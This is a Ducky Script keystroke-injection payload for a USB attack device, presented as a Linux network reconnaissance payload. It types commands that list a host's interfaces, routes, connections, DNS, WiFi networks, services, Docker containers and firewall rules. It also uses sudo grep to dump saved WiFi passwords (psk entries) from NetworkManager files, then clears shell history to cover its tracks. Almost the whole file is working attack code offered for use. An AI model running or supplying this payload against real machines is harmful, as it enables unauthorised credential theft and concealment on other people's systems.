#!/bin/bash
# Linux Network Reconnaissance Payload
# Gathers network information from a Linux host

# Open terminal
CTRL ALT t
DELAY 1000

# Start collecting data
STRING echo "=== NETWORK RECONNAISSANCE STARTING ==="
ENTER

# Network interfaces
STRING echo -e "\n=== NETWORK INTERFACES ==="
ENTER
STRING ip addr show
ENTER
DELAY 500

# Routing table
STRING echo -e "\n=== ROUTING TABLE ==="
ENTER
STRING ip route show
ENTER
DELAY 500

# ARP cache
STRING echo -e "\n=== ARP CACHE ==="
ENTER
STRING arp -a
ENTER
DELAY 500

# Active connections
STRING echo -e "\n=== ACTIVE CONNECTIONS ==="
ENTER
STRING ss -tuln
ENTER
DELAY 500

# DNS configuration
STRING echo -e "\n=== DNS CONFIGURATION ==="
ENTER
STRING cat /etc/resolv.conf
ENTER
DELAY 500

# Hosts file
STRING echo -e "\n=== HOSTS FILE ==="
ENTER
STRING cat /etc/hosts
ENTER
DELAY 500

# WiFi information (if available)
STRING echo -e "\n=== WIFI INFORMATION ==="
ENTER
STRING nmcli dev wifi
ENTER
DELAY 500

# Saved WiFi passwords (requires sudo)
STRING echo -e "\n=== SAVED WIFI PASSWORDS ==="
ENTER
STRING sudo grep -r "psk=" /etc/NetworkManager/system-connections/ 2>/dev/null
ENTER
DELAY 2000

# Check for interesting services
STRING echo -e "\n=== RUNNING SERVICES ==="
ENTER
STRING systemctl list-units --type=service --state=running | grep -E "ssh|apache|nginx|mysql|postgresql|docker"
ENTER
DELAY 500

# Check for Docker containers
STRING echo -e "\n=== DOCKER CONTAINERS ==="
ENTER
STRING docker ps 2>/dev/null || echo "Docker not installed or not accessible"
ENTER
DELAY 500

# Network namespaces
STRING echo -e "\n=== NETWORK NAMESPACES ==="
ENTER
STRING ip netns list 2>/dev/null || echo "No network namespaces or insufficient privileges"
ENTER
DELAY 500

# Firewall rules
STRING echo -e "\n=== FIREWALL RULES ==="
ENTER
STRING sudo iptables -L -n 2>/dev/null || echo "Cannot access firewall rules"
ENTER
DELAY 1000

# Clean history
STRING history -c
ENTER
STRING clear
ENTER

# Exit
STRING exit
ENTER